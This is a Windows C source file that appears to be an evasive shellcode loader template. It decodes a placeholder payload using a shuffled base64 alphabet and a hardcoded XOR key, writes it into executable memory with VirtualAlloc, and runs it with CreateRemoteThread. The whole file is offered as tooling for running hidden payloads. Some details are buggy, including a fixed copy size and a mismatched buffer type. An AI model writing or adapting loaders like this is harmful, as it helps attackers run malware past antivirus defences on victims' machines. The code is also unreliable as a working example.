#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static const char base64_table[] = "Ag9jCXabcJKLV2345WmnopuvwxYZklMhi78NOPrstTUByz0defDEFGHI16+/QRSq";
static unsigned char shellcode[] = "your encrypted shellcode";
static const char *key = "AeB&79!ra0(3*)";

void base64_decode(char *input, unsigned char **output) {
    int len = strlen(input);
    if (len % 4 != 0) return;

    int output_len = len / 4 * 3;
    if (input[len - 1] == '=') output_len--;
    if (input[len - 2] == '=') output_len--;

    *output = (unsigned char *)malloc(output_len);
    if (*output == NULL) return;

    for (int i = 0, j = 0; i < len;) {
        int a = input[i] == '=' ? 0 : strchr(base64_table, input[i]) - base64_table;
        int b = input[i + 1] == '=' ? 0 : strchr(base64_table, input[i + 1]) - base64_table;
        int c = input[i + 2] == '=' ? 0 : strchr(base64_table, input[i + 2]) - base64_table;
        int d = input[i + 3] == '=' ? 0 : strchr(base64_table, input[i + 3]) - base64_table;

        (*output)[j++] = (a << 2) | (b >> 4);
        if (input[i + 2] != '=') (*output)[j++] = (b << 4) | (c >> 2);
        if (input[i + 3] != '=') (*output)[j++] = (c << 6) | d;

        i += 4;
    }
}

void xor_encrypt_decrypt(char *input, char *output, char *key, int len) {
    int key_length = strlen(key);
    for (int i = 0; i < len; i++) {
        output[i] = input[i] ^ key[i % key_length];
    }
    output[len] = '\0';
}


int main() {
    unsigned char *decoded = NULL;
    char decrypted[2048];
    base64_decode(shellcode, &decoded);
    for(int i = strlen(shellcode)/4*3-1; i>=0 ; i--){
        if (decoded[i] != '\x00') {
            xor_encrypt_decrypt(decoded, decrypted, key, i + 1);
            break;
        }
    }


    void *exec_mem = VirtualAlloc(0, sizeof(decrypted), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        perror("VirtualAlloc failed");
        return -1;
    }
    memcpy(exec_mem, decrypted, sizeof(decrypted));
    HANDLE hThread = CreateRemoteThread(GetCurrentProcess(), NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (hThread == NULL) {
        perror("CreateThread failed");
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return -1;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
}
